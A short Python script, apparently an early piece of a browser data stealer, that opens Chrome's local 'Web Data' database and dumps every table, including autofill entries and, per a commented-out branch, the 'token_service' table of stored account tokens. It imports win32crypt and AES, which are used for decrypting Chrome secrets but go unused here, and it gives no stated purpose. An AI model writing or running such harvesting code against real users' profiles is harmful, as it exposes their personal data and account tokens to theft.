import os
import json
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES

db = os.path.expandvars("%LOCALAPPDATA%/Google/Chrome/User Data/Default/Web Data")


connection = sqlite3.connect(db)
cursor = connection.cursor()



cursor.execute("SELECT * FROM sqlite_master WHERE type='table';")
tables  = cursor.fetchall()
for table in tables:
    print(table)
    query = "SELECT * FROM "+table[1]
    cursor.execute(query)
    """
    if table[1] == "token_service":
        parse_token_service(cursor.fetchall())
    else:
    """
    try:
        print(cursor.fetchall())
    except:
        print("[-] Failed to parse table -> ", table[1])
        continue
    print("-"*50)


"""
cursor.execute("SELECT sql from sqlite_schema where name='autofill';")
print(cursor.fetchall())
cursor.execute("SELECT * FROM autofill;")
print(cursor.fetchall())
cursor.execute("SELECT * FROM autofill_sync_metadata;")
print(cursor.fetchall())
"""